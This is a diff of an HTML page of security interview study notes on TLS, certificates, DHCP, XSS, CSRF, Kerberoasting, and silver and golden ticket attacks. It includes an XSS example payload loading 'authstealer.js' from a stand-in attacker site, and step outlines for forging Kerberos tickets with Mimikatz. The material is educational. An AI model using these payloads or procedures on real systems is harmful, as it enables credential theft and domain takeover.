@@ -59,7 +59,14 @@
 <hr>
 <h2> <span style="color:#da1953">Ind</span>ex </h2>
 <ul>
-<li><a href="#TLS">TLS (Transport Layer Security)</a></li>
+<li><a href="#TLS">TLS (Transport Layer Security)</a>
+<ul>
+<li><a href="#">Introduction</a></li>
+<li><a href="#">Digital Certificates</a></li>
+<li><a href="#">TLS Handshake</a></li>
+<li><a href="#">Heartbleed</a></li>
+</ul>
+</li>
 <li><a href="#DIGCERT">Digital Certificates</a></li>
 <li><a href="#DHCP">DHCP Protocol</a></li>
 <li><a href="#ARP">ARP Protocol</a></li>
@@ -119,7 +126,7 @@
 <p>In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party, trusted both by the subject (owner) of the certificate and by the party relying upon the certificate.</p>
 <p>In cryptography, a public key certificate, also known as a digital certificate or identity certificate, is an electronic document used to prove the ownership of a public key. The certificate includes information about the key, information about the identity of its owner (called the subject), and the digital signature of an entity that has verified the certificate&rsquo;s contents (called the issuer). If the signature is valid, and the software examining the certificate trusts the issuer, then it can use that key to communicate securely with the certificate&rsquo;s subject. In Transport Layer Security (TLS) a certificate&rsquo;s subject is typically a computer or other device, though TLS certificates may identify organizations or individuals in addition to their core role in identifying devices. TLS is notable for being a part of HTTPS, a protocol for securely browsing the web.</p>
 <p>In a typical public-key infrastructure (PKI) scheme, the certificate issuer is a certificate authority (CA), usually a company that charges customers to issue certificates for them. By contrast, in a web of trust scheme, individuals sign each other&rsquo;s keys directly, in a format that performs a similar function to a public key certificate.</p>
-<p><img src="/interviewquestions/digitalcertificate/certificatehierarchy.jpg" alt="Digital certificate hierarchy"></p>
+<p><img src="/interviewquestions/digitalcertificate/certificatehierarchy1.JPG" alt="Digital certificate hierarchy"></p>
 <hr>
 <h2 id=DHCP> <span style="color:#da1953">DHC</span>P Protocol </h2>
 <h3 id="introduction-2">Introduction</h3>
@@ -147,6 +154,9 @@
 <p>Step 4
 <img src="/interviewquestions/dhcp/step4.jpg" alt="Step 4"></p>
 <p>It is an acknowledgement packet to confirm that the server will registers client’s information.</p>
+<hr>
+<p>ROUTING PROTOCOLS</p>
+<p>OSPF</p>
 <hr>
 <h2 id=ARP> <span style="color:#da1953">ARP</span> Protocol </h2>
 <h3 id="introduction-3">Introduction</h3>
@@ -344,7 +354,11 @@ If the site is vulnerable in the text are HTML commands can be execute so a prop
 <code>I love the puppies in this story! They're so cute!&lt;script src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;</code>).<br><br>
 If the link is clicked the script <em>authstealer.js</em> will run and operations will be executed.</p>
 </li>
+<li>
+<p><strong>DOM Based XSS</strong></p>
+</li>
 </ul>
+<p><a href="https://www.youtube.com/watch?v=A5faK0BC8cE">https://www.youtube.com/watch?v=A5faK0BC8cE</a></p>
 <hr>
 <h2 id=CSRF> <span style="color:#da1953">CSR</span>F</h2>
 <p>CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.</p>
@@ -371,16 +385,29 @@ If the link is clicked the script <em>authstealer.js</em> will run and operation
 <p>Steps to compromise service with SPN:</p>
 <ul>
 <li>Get SPN (Service Principle Name) via script <code>GetUserSPNs.py</code>.</li>
-<li>Choose a SPN and request a ticket with the choosen SPN, susually the choosen SPN should be Administrator in order to priviledge escalete.</li>
+<li>Choose a SPN and request a ticket with the choosen SPN, susually the choosen SPN with high priviledge in order to priviledge escalete.</li>
 <li>The ticket will be in the memory encrypted with the NTLM hash of the password of the service account.</li>
 <li>Use Mimikatz to dump the ticket from memory.</li>
 <li>Crack the ticket offline with any tool.</li>
 </ul>
 <p>or GetUserSPNs from Imapcket Suite can  be used to list and retrive the service ticket and then crack it offline (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting">tutorial</a>).</p>
-<h4 id="what-is-a-silver-ticket">What is a silver ticket?</h4>
+<h4 id="silver-ticket">Silver ticket</h4>
 <p>This technique requires a cracked service password which can be obtained via Kerberosting attack.</p>
+<ul>
+<li>Crack the password of a Service account obtained from Kerberosting attack.</li>
+<li>Attacker converts the password in NTLM Hash of the service account.</li>
+<li>Using Mimikatz forge a TGS ticket using NTLM hash of the service account.</li>
+<li>Attacker uses the ticket to access a specific service on a target host bypassing any communication with the Active Directory Domain Controller.</li>
+<li>Attacker is able to forge Privileged Account Certificate and other information as part of the service ticket.</li>
+</ul>
 <p><a href="https://www.youtube.com/watch?v=GTJyd-AMfuM">https://www.youtube.com/watch?v=GTJyd-AMfuM</a></p>
-<h4 id="what-is-a-golden-ticket">What is a golden ticket?</h4>
+<h4 id="golden-ticket">Golden ticket</h4>
+<ul>
+<li>Once an attacker has obtained priviledged access to Active Directory, they can use Mimikatz to extract the KRBTGT (Kerberos Ticket Granting Ticket) accounts password hash, in addition to the name and the SID of the domainto which the KRBTGT account belongs.</li>
+<li>Using Mimikatz the attacker generates a ticket (a golden ticket) leveraging various command and paramenters.</li>
+<li>Once the golden ticket has been generated, the attacker will perform <em>Pass-The-Ticket</em> attack by loading the ticket into the current session providing them access to any resource connected to Active Directory.</li>
+</ul>
+<p><a href="https://www.youtube.com/watch?v=f6SleGakcE0">https://www.youtube.com/watch?v=f6SleGakcE0</a></p>
 <hr>
 <h2 id=SUBNET> <span style="color:#da1953">Sub</span>netting and calculations</h2>
 <p>Address:   192.168.0.1          11000000.10101000.00000000 .00000001<br>
@@ -530,6 +557,13 @@ Cross-site request forgery (or CSRF) allows an attacker to induce a victim user 
 <p>Remote code execution is a major security lapse, and the last step along the road to complete system takeover. After gaining access, an attacker will attempt to escalate their privileges on the server, install malicious scripts, or make your server part of a botnet to be used at a later date.</p>
 <h3 id="how-do-you-exploit-the-shellshock-vulnerability-and-what-can-an-attacker-do-with-it">How do you exploit the Shellshock vulnerability and what can an attacker do with it?</h3>
 <h3 id="how-would-you-bypass-dep-or-aslr">How would you bypass DEP or ASLR</h3>
+<h3 id="switch-vs-router">Switch vs Router</h3>
+<h3 id="more-qa-from-githb">More Q&amp;A from GitHb</h3>
+<h3 id="simmetric-key-algorithm-and-key-lenght">Simmetric key algorithm and Key lenght</h3>
+<p><a href="https://danielmiessler.com/study/infosec_interview_questions/">https://danielmiessler.com/study/infosec_interview_questions/</a></p>
+<p><a href="https://github.com/justinltodd/security-interview-questions">https://github.com/justinltodd/security-interview-questions</a></p>
+<p><a href="https://github.com/DopplerHQ/awesome-interview-questions">https://github.com/DopplerHQ/awesome-interview-questions</a></p>
+<p><a href="https://github.com/gracenolan/Notes/blob/master/interview-study-notes-for-security-engineering.md">https://github.com/gracenolan/Notes/blob/master/interview-study-notes-for-security-engineering.md</a></p>
 
 </div>
 
